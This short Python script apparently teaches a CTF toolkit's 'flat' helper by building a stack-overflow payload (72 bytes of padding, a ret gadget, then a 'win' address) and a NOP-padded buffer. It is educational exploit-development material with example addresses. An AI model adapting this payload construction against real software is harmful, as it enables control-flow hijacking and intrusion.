#!/usr/bin/env python3
"""Build a stack-overflow payload with `flat`.

Once you know the offset, the payload is just padding + the addresses you want
on the stack. `flat` packs ints as little-endian 64-bit and pads to a fixed
size, so "fill 72 bytes, then a `ret`, then `win`" reads exactly like that.
"""
from ctfkit.pwn import flat, p64

ret_gadget = 0x40101A
win = 0x401196

payload = flat(b"a" * 72, ret_gadget, win)
print("length:", len(payload))
print("hex:", payload.hex())

# `length=` pads with filler so you can overflow an exact buffer size.
padded = flat(0xDEADBEEF, length=16, filler=b"\x90")
print("padded:", padded.hex(), "(", len(padded), "bytes )")
